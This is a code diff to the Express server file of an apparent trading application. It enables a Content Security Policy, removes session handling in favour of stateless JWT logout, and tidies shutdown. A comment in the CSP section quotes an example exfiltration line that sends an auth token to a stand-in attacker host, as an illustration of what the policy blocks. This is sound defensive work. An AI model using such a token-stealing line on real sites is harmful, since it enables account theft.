@@ -7,8 +7,6 @@
 process.env.TZ = 'Asia/Kolkata';
 
 import express from 'express';
-import fs from 'fs';
-import path from 'path';
 import helmet from 'helmet';
 import cors from 'cors';
 import compression from 'compression';
@@ -19,7 +17,6 @@ import db from './src/core/database.js';
 import pollingService from './src/services/polling.service.js';
 import marketDataFeedService from './src/services/market-data-feed.service.js';
 import autoExitService from './src/services/auto-exit.service.js';
-import telegramService from './src/services/telegram.service.js';
 import openalgoClient from './src/integrations/openalgo/client.js';
 import settingsService from './src/services/settings.service.js';
 import instanceHealthService from './src/services/instance-health.service.js';
@@ -30,7 +27,7 @@ import tradingviewWebhookRoutes from './src/routes/tradingview-webhook.js';
 import idempotencyService from './src/services/idempotency.service.js';
 
 // Middleware
-import { configureSession, requireAuth, optionalAuth, getUserWithRole, isSecureBaseUrl, verifyLocalToken } from './src/middleware/auth.js';
+import { requireAuth, optionalAuth, verifyLocalToken } from './src/middleware/auth.js';
 import { errorHandler, notFoundHandler } from './src/middleware/error-handler.js';
 import { correlationId, requestLogger, bodyParserErrorHandler } from './src/middleware/request-logger.js';
 import { checkInstrumentsRefresh, evaluateStartupReadiness } from './src/middleware/instruments-refresh.middleware.js';
@@ -60,8 +57,8 @@ async function startBackgroundServices() {
     await pollingService.start();
     log.info('Polling service started');
 
-    // Telegram integration is webhook-based (see routes/v1/telegram.js POST /webhook), not
-    // polling-based - telegramService has no startPolling/stopPolling methods to call here.
+    // Telegram integration is webhook-based (see routes/v1/telegram.js POST /webhook), so no
+    // polling service needs to be started here.
   } catch (err) {
     servicesStarted = false;
     log.error('Failed to start background services', err);
@@ -72,6 +69,7 @@ async function startBackgroundServices() {
 function stopBackgroundServices() {
   try {
     marketDataFeedService.stop && marketDataFeedService.stop();
+    autoExitService.stop && autoExitService.stop();
     pollingService.stop && pollingService.stop();
   } catch (err) {
     log.warn('Error stopping background services', { error: err.message });
@@ -90,8 +88,40 @@ app.set('trust proxy', 1);
  */
 
 // Security
+//
+// Every asset this app serves is same-origin (see public/*.html - local fonts, vendored charts,
+// no CDN), and nothing uses eval or new Function, so a real CSP costs nothing to switch on.
+//
+// script-src keeps 'unsafe-inline' deliberately: the UI has ~150 onclick= handlers, most of them
+// written into innerHTML by the dashboard modules, and a nonce cannot cover attributes. Dropping
+// it means rewiring all of them to addEventListener - worth doing, but it is a UI-wide refactor,
+// not a header change.
+//
+// The directive that earns its keep even with inline scripts allowed is connect-src 'self': the
+// auth token lives in localStorage, so the payoff from an XSS is shipping it somewhere. fetch,
+// XHR, WebSocket and sendBeacon to any other origin are now refused, as is `new Image().src =
+// '//attacker/?' + token` (img-src) and pulling a second-stage payload (script-src 'self').
+// 'self' covers the same-origin WebSocket gateway at WS_GATEWAY_PATH under CSP Level 3.
 app.use(helmet({
-  contentSecurityPolicy: false, // Disable for development
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      // helmet defaults this to 'none', which blocks event-handler ATTRIBUTES specifically -
+      // script-src 'unsafe-inline' does not cover them. Left at the default it would have
+      // silently killed every onclick= in the dashboard, i.e. most of the UI.
+      scriptSrcAttr: ["'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", 'data:'],
+      fontSrc: ["'self'"],
+      connectSrc: ["'self'"],
+      objectSrc: ["'none'"],
+      baseUri: ["'self'"],
+      formAction: ["'self'"],
+      frameAncestors: ["'none'"],
+      upgradeInsecureRequests: null, // set by deployment TLS, not by the app
+    },
+  },
 }));
 
 // CORS
@@ -115,9 +145,6 @@ app.use(correlationId);
 
 // Request logging
 app.use(requestLogger);
-
-// Session
-app.use(configureSession());
 
 // Optional auth (sets req.user in test mode)
 app.use(optionalAuth);
@@ -145,26 +172,17 @@ app.use('/webhook/tradingview', tradingviewWebhookRoutes);
 app.use('/api/v1', apiV1Routes);
 
 // Auth: login/register/change-password are local email+password (see public/login.html and
-// src/routes/v1/auth.js) - this endpoint just clears the separate local session cookie used
-// for WS gateway auth.
-app.post('/auth/logout', (req, res, next) => {
-  try {
-    const sessionId = req.sessionID;
-    req.session.destroy(() => {
-      // Explicitly clear the session cookie so the browser stops sending it
-      // Must mirror configureSession()'s cookie options exactly - a differing Secure or
-      // SameSite makes the browser treat this as a different cookie and leave the real one set.
-      res.clearCookie('connect.sid', {
-        httpOnly: true,
-        secure: isSecureBaseUrl(),
-        sameSite: 'lax',
-      });
-      log.info('Session destroyed on logout', { sessionId });
-      res.json({ status: 'success', message: 'Logged out successfully' });
-    });
-  } catch (error) {
-    next(error);
-  }
+// src/routes/v1/auth.js).
+//
+// Logout is client-side by definition here: the credential is a stateless JWT held in
+// localStorage, and api-client.js has already removed it before calling this. There is no
+// server-side session to destroy - this used to call req.session.destroy() and clear a
+// 'connect.sid' cookie that the app never issued. Kept as an endpoint because two clients call
+// it (api-client.js, access-pending.html) and because it is the hook a future token denylist
+// would attach to.
+app.post('/auth/logout', (req, res) => {
+  log.info('Logout', { user_id: req.user?.id || null });
+  res.json({ status: 'success', message: 'Logged out successfully' });
 });
 
 // Current user
@@ -347,16 +365,21 @@ async function startServer() {
 /**
  * Graceful Shutdown
  */
+let shutdownStarted = false;
+
 async function shutdown() {
+  if (shutdownStarted) return;
+  shutdownStarted = true;
   log.info('Shutting down server...');
 
   try {
     // Telegram is webhook-based, not polling-based - no stopPolling method to call here
     // (see the matching note at startup, ~line 66).
 
-    // Stop polling service
-    pollingService.stop();
-    log.info('Polling service stopped');
+    stopBackgroundServices();
+    instanceHealthService.stop();
+    instrumentsService.stopCryptoDailyRefresh();
+    wsGatewayService.stop();
 
     // Close database
     await db.close();
